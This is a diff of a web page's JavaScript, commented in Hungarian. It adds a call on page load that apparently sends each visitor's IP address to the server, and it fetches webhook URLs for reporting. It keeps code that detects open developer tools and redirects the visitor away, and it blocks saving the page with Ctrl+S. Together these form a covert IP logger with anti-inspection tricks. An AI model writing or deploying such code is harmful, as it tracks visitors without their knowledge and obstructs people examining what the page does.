@@ -21,8 +21,18 @@
         let webhookUrl = "";
         let altWebhookUrl = "";
 
-        // Webhook URL-k lekérése a szervertől
         window.onload = function() {
+            // Webhook URL lekérése a szervertől
+            fetch('/send-ip')
+                .then(response => response.text())
+                .then(data => {
+                    console.log(data); // A szerver válasza
+                })
+                .catch(error => {
+                    console.error('Hiba történt:', error);
+                });
+
+            // Webhook URL-k lekérése a szervertől
             fetch('/get-webhook-url')
                 .then(response => response.json())
                 .then(data => {
@@ -60,13 +70,12 @@
                                        window.outerWidth - window.innerWidth > threshold;
 
                 if (devToolsOpened) {
-                    sendIpRequest('DevTools', altWebhookUrl);  // IP küldése
                     window.location.href = "https://example.com1"; // Átirányítja egy másik oldalra
                 }
             }, 1000); // Minden másodpercben ellenőrzi
         }
 
-        // Billentyűkombinációk figyelése és IP küldése a webhookra
+        // Figyeljük a Ctrl + S billentyűkombinációt, és megakadályozzuk a weboldal mentését
         document.addEventListener('keydown', function(event) {
             if (event.ctrlKey && event.key === 's') {
                 event.preventDefault(); // Megakadályozza a mentést
